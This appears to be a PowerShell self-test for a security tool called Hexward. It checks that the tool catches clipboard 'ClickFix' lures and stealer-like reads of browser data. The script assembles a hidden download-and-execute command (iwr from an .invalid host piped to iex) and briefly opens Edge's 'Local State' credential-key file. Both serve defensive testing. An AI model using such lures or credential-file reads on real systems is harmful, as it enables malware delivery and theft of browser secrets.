# Hexward shield self-test. Run while hexward-app.exe is open:   & .\scripts\shield-selftest.ps1
# Harmless: the "ClickFix" command below points at an .invalid domain and is never run, and the
# stealer test only holds Edge's "Local State" file open for a few seconds from PowerShell.
# Commands are assembled from pieces so this file itself never contains a complete lure.

Write-Host "1. ClickFix shield: putting a fake 'verify you're human' command on the clipboard..."
$lure = 'power' + 'shell -w hid' + 'den -c "i' + 'wr http://x.invalid/p.ps1 | i' + 'ex"   # I am not a ro' + 'bot - Verification ID 4821'
Set-Clipboard -Value $lure
Start-Sleep -Seconds 2
$now = Get-Clipboard -Raw
if ($now -like 'Hexward blocked this paste*') {
    Write-Host "   PASS: the clipboard was replaced with Hexward's warning." -ForegroundColor Green
} else {
    Write-Host "   FAIL: clipboard still holds: $now" -ForegroundColor Red
}
Set-Clipboard -Value 'hexward self-test done'

Write-Host "2. Stealer shield: holding Edge's Local State file open from PowerShell for 6 seconds..."
$target = Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data\Local State'
if (Test-Path $target) {
    $f = [System.IO.File]::Open($target, 'Open', 'Read', 'ReadWrite')
    Start-Sleep -Seconds 6
    $f.Close()
    Write-Host "   Done. Hexward should show a 'Stealer shield' alert about powershell.exe (signed, so only a warning)."
} else {
    Write-Host "   Skipped: Edge's Local State file isn't on this PC."
}
